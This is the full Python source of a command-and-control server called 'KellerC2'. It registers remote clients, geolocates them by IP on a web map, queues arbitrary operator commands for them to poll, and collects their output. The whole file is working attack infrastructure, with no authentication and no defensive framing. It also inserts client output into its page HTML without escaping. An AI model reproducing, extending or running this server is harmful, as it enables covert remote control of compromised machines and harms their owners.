#!/usr/bin/env python3
from http.server import HTTPServer, ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from urllib.request import urlopen
from urllib.error import URLError
import json
import queue
import random
import time

INDEX_PAGE = """
<html>
<head>
    <title>KellerC2</title>
    <link rel=\"stylesheet\" href=\"https://unpkg.com/leaflet@1.9.4/dist/leaflet.css\" />
    <style>
      html, body { height: 100%; margin: 0; }
      #map { height: 100%; }
    </style>
    <script src=\"https://unpkg.com/leaflet@1.9.4/dist/leaflet.js\"></script>
    <script>
    let map;
    let markers = {};
    const STALE = 60000; // fade after 1 min
    const REMOVE = 300000; // remove after 5 min

    function popupContent(c) {
        const ts = new Date(c.last_seen * 1000).toLocaleString();
        return `<b>${c.id}</b><br>IP: ${c.ip}<br>Last seen: ${ts}<br>
            <form onsubmit=\"sendCmd(event,this,'${c.id}')\">
            <input name=cmd placeholder=Command />
            <button type=submit>Send</button>
            </form><pre id=res_${c.id}>${c.result || ''}</pre>`;
    }

    async function load() {
        const res = await fetch('/clients');
        const clients = await res.json();
        const now = Date.now();
        clients.forEach(c => {
            const age = now - c.last_seen * 1000;
            if (age > REMOVE) {
                if (markers[c.id]) {
                    map.removeLayer(markers[c.id]);
                    delete markers[c.id];
                }
                return;
            }
            let m = markers[c.id];
            const content = popupContent(c);
            if (!m) {
                m = L.marker([c.lat, c.lon]).addTo(map);
                m.bindPopup(content);
                markers[c.id] = m;
            } else {
                m.setLatLng([c.lat, c.lon]);
                if (m.getPopup()) m.getPopup().setContent(content);
                else m.bindPopup(content);
            }
            m.setOpacity(age > STALE ? 0.5 : 1);
            const pre = document.getElementById('res_'+c.id);
            if (pre) pre.textContent = c.result || '';
        });
    }

    async function sendCmd(e, form, id) {
        e.preventDefault();
        const cmd = form.cmd.value;
        await fetch('/send', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({client_id:id, command:cmd})
        });
        form.cmd.value='';
    }

    window.onload = () => {
        map = L.map('map').setView([20,0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors'
        }).addTo(map);
        load();
        setInterval(load, 5000);
    };
    </script>
</head>
<body>
    <div id=\"map\"></div>
</body>
</html>
"""

clients = set()
client_queues = {}
client_results = {}
client_locations = {}
client_ips = {}
ip_counts = {}
client_last_seen = {}

def geolocate(ip):
    """Return (lat, lon) for the given IP using ip-api.com."""
    try:
        with urlopen(f"http://ip-api.com/json/{ip}", timeout=5) as r:
            data = json.load(r)
            if data.get("status") == "success":
                return float(data.get("lat", 0)), float(data.get("lon", 0))
    except URLError:
        pass
    # fall back to a random location if lookup fails
    return random.uniform(-60, 60), random.uniform(-180, 180)

class Handler(BaseHTTPRequestHandler):
    def _safe_write(self, body: bytes) -> None:
        """Write to the socket, ignoring errors if the client disconnected."""
        try:
            self.wfile.write(body)
        except OSError:
            pass

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        if self.path == '/register':
            client_id = None
            try:
                payload = json.loads(data.decode())
                client_id = payload.get('client_id')
                ip = payload.get('public_ip') or self.client_address[0]
            except Exception:
                pass
            if client_id:
                clients.add(client_id)
                client_queues.setdefault(client_id, queue.Queue())
                client_results.setdefault(client_id, '')
                client_ips[client_id] = ip
                ip_counts[ip] = ip_counts.get(ip, 0) + 1
                client_last_seen[client_id] = time.time()
                if client_id not in client_locations:
                    lat, lon = geolocate(ip)
                    if ip_counts[ip] > 1:
                        lat += random.uniform(-0.02, 0.02)
                        lon += random.uniform(-0.02, 0.02)
                    client_locations[client_id] = (lat, lon)
                body = b'Registered'
                self.send_response(200)
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self._safe_write(body)
            else:
                body = b'Bad Request'
                self.send_response(400)
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self._safe_write(body)
        elif self.path == '/send':
            try:
                payload = json.loads(data.decode())
                cid = payload.get('client_id')
                cmd = payload.get('command')
                if cid in clients and cmd:
                    client_queues[cid].put(cmd)
                    body = b'Command queued'
                    self.send_response(200)
                    self.send_header('Content-Length', str(len(body)))
                    self.end_headers()
                    self._safe_write(body)
                    return
            except Exception:
                pass
            body = b'Bad Request'
            self.send_response(400)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self._safe_write(body)
        elif self.path == '/result':
            try:
                payload = json.loads(data.decode())
                cid = payload.get('client_id')
                res = payload.get('result')
                if cid in clients:
                    client_results[cid] = res
                    client_last_seen[cid] = time.time()
                    body = b'Result stored'
                    self.send_response(200)
                    self.send_header('Content-Length', str(len(body)))
                    self.end_headers()
                    self._safe_write(body)
                    return
            except Exception:
                pass
            body = b'Bad Request'
            self.send_response(400)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self._safe_write(body)
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/clients':
            body = json.dumps([
                {
                    'id': cid,
                    'ip': client_ips.get(cid, ''),
                    'lat': client_locations.get(cid, (0, 0))[0],
                    'lon': client_locations.get(cid, (0, 0))[1],
                    'result': client_results.get(cid, ''),
                    'last_seen': client_last_seen.get(cid, 0)
                }
                for cid in sorted(clients)
            ]).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self._safe_write(body)
        elif parsed.path == '/poll':
            qs = parse_qs(parsed.query)
            cid = qs.get('client_id', [None])[0]
            if cid in clients:
                client_last_seen[cid] = time.time()
                try:
                    cmd = client_queues[cid].get(timeout=30)
                except queue.Empty:
                    cmd = None
                body = json.dumps({'command': cmd}).encode()
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self._safe_write(body)
            else:
                self.send_response(404)
                self.send_header('Content-Length', '0')
                self.end_headers()
        elif parsed.path == '/result':
            qs = parse_qs(parsed.query)
            cid = qs.get('client_id', [None])[0]
            if cid in clients:
                body = json.dumps({'result': client_results.get(cid, '')}).encode()
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self._safe_write(body)
            else:
                self.send_response(404)
                self.send_header('Content-Length', '0')
                self.end_headers()
        elif parsed.path == '/':
            body = INDEX_PAGE.encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self._safe_write(body)
        else:
            self.send_response(404)
            self.send_header('Content-Length', '0')
            self.end_headers()

def run(port=8000):
    server_address = ('', port)
    # ThreadingHTTPServer allows multiple clients to poll concurrently
    httpd = ThreadingHTTPServer(server_address, Handler)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
